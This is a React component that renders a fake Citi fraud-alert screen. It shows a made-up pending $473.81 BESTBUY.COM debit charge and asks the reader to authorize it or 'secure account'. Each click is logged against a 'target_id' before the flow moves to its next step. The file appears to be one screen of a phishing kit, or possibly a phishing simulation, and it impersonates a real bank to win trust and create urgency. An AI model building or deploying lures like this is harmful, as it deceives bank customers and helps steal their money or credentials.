'use client';
import "./ReviewTrans.scss";
import { FaCircleHalfStroke } from "react-icons/fa6";
import { FaCheck } from "react-icons/fa";
import { FaCircleXmark } from "react-icons/fa6";
import { FaXmark } from "react-icons/fa6";
import { FaTimes } from "react-icons/fa";
import addIntakeEvent from "@/app/(tropic)/addIntakeEvent";
import { getTargetId } from "@/app/(tropic)/getTargetId";
import proceedStep from "@/app/(tropic)/proceedStep";
export default function ReviewTrans({ setParentLoading }) {
    // dummy charges:
    // $473.81 BESTBUY #N921
    // $500.00 WALMART SUPERCENTER #R043
    async function handleResponse(response) {
        await addIntakeEvent({
            type: 'interaction',
            interaction_title: 'Clicked transaction ' + response,
            target_id: await getTargetId(),
        })
        setParentLoading(true);
        setTimeout(() => {
            setParentLoading(false);
            proceedStep();
        }, 4000)
    }
    return (
        <div className="ReviewTrans Main">
            <h2>Review Transaction</h2>
            <div className="card">
                <p>
                    We detected a suspicious transaction on your debit card.
                </p>
                <p>
                    Please review the details to keep your account secure.
                </p>
                <p className="bold">
                    Did you authorize this transaction?
                </p>
                <div className="trans">
                    <div className="left">
                        <span className="merchant">
                            BESTBUY.COM
                        </span>
                        <span className="status">
                            <span>
                                Pending - {new Date().toLocaleDateString()}
                            </span>
                        </span>
                    </div>
                    <div className="right">
                        <span className="bold">
                            $473.81
                        </span>
                    </div>
                </div>
                <button
                    onClick={() => handleResponse('authorized')}
                    className="yes">
                    <FaCheck />
                    <span>
                        Yes, this was authorized
                    </span>
                </button>
                <button
                    onClick={() => handleResponse('unauthorized')}
                    className="no">
                    <FaTimes className="tooSmall" />
                    <span>
                        No, secure account
                    </span>
                </button>
            </div>
            <p className="legal">
                All debit cards issued by Citi are protected by our zero
                    liability policy when you notify us of unauthorized transactions within 60 days.
            </p>
        </div>
    )
}